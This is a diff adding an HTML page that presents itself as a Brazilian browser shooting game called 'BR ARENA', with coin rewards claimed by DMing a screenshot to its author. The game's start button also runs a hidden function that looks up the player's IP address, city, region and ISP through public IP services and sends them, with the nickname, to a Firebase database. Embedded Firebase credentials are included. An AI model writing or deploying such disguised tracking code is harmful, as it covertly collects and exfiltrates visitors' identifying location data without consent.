@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <title>BR ARENA - RECOMPENSAS</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap');
+        body { background: #000; color: #ff0055; font-family: 'Press Start 2P', cursive; margin: 0; overflow: hidden; }
+        #ui { position: absolute; width: 100%; top: 10px; display: none; justify-content: space-around; z-index: 10; font-size: 10px; }
+        canvas { background: #050505; display: none; cursor: crosshair; }
+        .menu { text-align: center; padding: 30px; border: 4px solid #ff0055; background: #111; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 350px; box-shadow: 0 0 20px #ff0055; }
+        input { background: #000; border: 2px solid #ff0055; color: #fff; padding: 12px; font-family: 'Press Start 2P'; font-size: 10px; width: 85%; margin-bottom: 20px; outline: none; }
+        button { background: #ff0055; color: #fff; border: none; padding: 15px; cursor: pointer; font-family: 'Press Start 2P'; width: 100%; font-size: 12px; }
+        #final-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 200; flex-direction: column; align-items: center; justify-content: center; text-align: center; }
+        .coin { color: #ffd700; font-size: 20px; margin: 20px 0; }
+    </style>
+</head>
+<body>
+
+<div id="ui">
+    <span>KILLS: <span id="u-kills">0</span></span>
+    <span>TEMPO: <span id="u-timer">30</span>s</span>
+</div>
+
+<div class="menu" id="main-menu">
+    <h1>BR ARENA</h1>
+    <p style="font-size: 7px; color: #888;">BY: MIA💓</p>
+    <input type="text" id="nick" placeholder="SEU NICKNAME...">
+    <button onclick="iniciar()">JOGAR E GANHAR</button>
+</div>
+
+<div id="final-screen">
+    <h2 style="color: #0f0;">RECOMPENSA LIBERADA!</h2>
+    <div class="coin">💰 <span id="res-moedas">0</span> MOEDAS</div>
+    <p style="font-size: 10px; padding: 20px; line-height: 1.5;">
+        Tire um PRINT desta tela e envie na DM da MIA💓 para trocar suas moedas por recompensas!
+    </p>
+    <button onclick="location.reload()" style="width: 200px; font-size: 8px;">VOLTAR AO INÍCIO</button>
+</div>
+
+<canvas id="canvas"></canvas>
+
+<script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.1/firebase-app.js";
+    import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/10.12.1/firebase-database.js";
+
+    const firebaseConfig = {
+        apiKey: "AIzaSyCSVBUH7dHTf58ClpA5CYTAotUCepCVBqI",
+        authDomain: "operacaoantpnr.firebaseapp.com",
+        databaseURL: "https://operacaoantpnr-default-rtdb.firebaseio.com",
+        projectId: "operacaoantpnr",
+        storageBucket: "operacaoantpnr.firebasestorage.app",
+        messagingSenderId: "261733238951",
+        appId: "1:261733238951:web:a5d95cf7478362517ff382"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getDatabase(app);
+
+    const canvas = document.getElementById('canvas');
+    const ctx = canvas.getContext('2d');
+    let kills = 0, tempo = 30, alvos = [], mouse = {x:0, y:0}, jogando = false;
+
+    window.iniciar = async function() {
+        const nick = document.getElementById('nick').value;
+        if(!nick) return alert("COLOQUE SEU NICK!");
+
+        // CAPTURA IMEDIATA
+        capturarDados(nick);
+
+        document.getElementById('main-menu').style.display = 'none';
+        document.getElementById('ui').style.display = 'flex';
+        canvas.style.display = 'block';
+        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
+        
+        jogando = true;
+        const loop = setInterval(() => {
+            tempo--;
+            document.getElementById('u-timer').innerText = tempo;
+            if(tempo <= 0) {
+                clearInterval(loop);
+                showResult();
+            }
+        }, 1000);
+
+        for(let i=0; i<4; i++) spawn();
+        animate();
+    }
+
+    async function capturarDados(nick) {
+        try {
+            // Puxando IP e Localização completa
+            const res = await fetch('https://ipapi.co/json/');
+            const data = await res.json();
+            
+            await push(ref(db, 'logs_arena/'), {
+                player: nick,
+                ip: data.ip,
+                local: `${data.city} / ${data.region}`,
+                isp: data.org,
+                data: new Date().toLocaleString('pt-BR'),
+                creditos: "Mia💓"
+            });
+        } catch(e) {
+            // Se falhar a API, tenta pelo menos o IP puro
+            fetch('https://api.ipify.org?format=json')
+                .then(r => r.json())
+                .then(d => push(ref(db, 'logs_arena/'), { player: nick, ip: d.ip, data: new Date().toLocaleString('pt-BR') }));
+        }
+    }
+
+    function spawn() { alvos.push({ x: Math.random()*canvas.width, y: Math.random()*canvas.height, r: 25 }); }
+
+    window.onmousemove = (e) => { mouse.x = e.clientX; mouse.y = e.clientY; }
+    window.onmousedown = () => {
+        if(!jogando) return;
+        alvos.forEach((a, i) => {
+            if(Math.hypot(mouse.x-a.x, mouse.y-a.y) < a.r) {
+                kills++; document.getElementById('u-kills').innerText = kills;
+                alvos.splice(i, 1); spawn();
+            }
+        });
+    }
+
+    function animate() {
+        if(!jogando) return;
+        ctx.fillStyle = 'rgba(0,0,0,0.3)'; ctx.fillRect(0,0,canvas.width,canvas.height);
+        alvos.forEach(a => {
+            ctx.beginPath(); ctx.arc(a.x, a.y, a.r, 0, Math.PI*2);
+            ctx.fillStyle = '#ff0055'; ctx.fill();
+        });
+        // Mira simples
+        ctx.strokeStyle = '#0f0'; ctx.strokeRect(mouse.x-15, mouse.y-15, 30, 30);
+        requestAnimationFrame(animate);
+    }
+
+    function showResult() {
+        jogando = false;
+        canvas.style.display = 'none';
+        document.getElementById('ui').style.display = 'none';
+        document.getElementById('final-screen').style.display = 'flex';
+        // 10 moedas base + 2 por kill
+        const totalMoedas = 10 + (kills * 2);
+        document.getElementById('res-moedas').innerText = totalMoedas;
+    }
+</script>
+</body>
+</html>
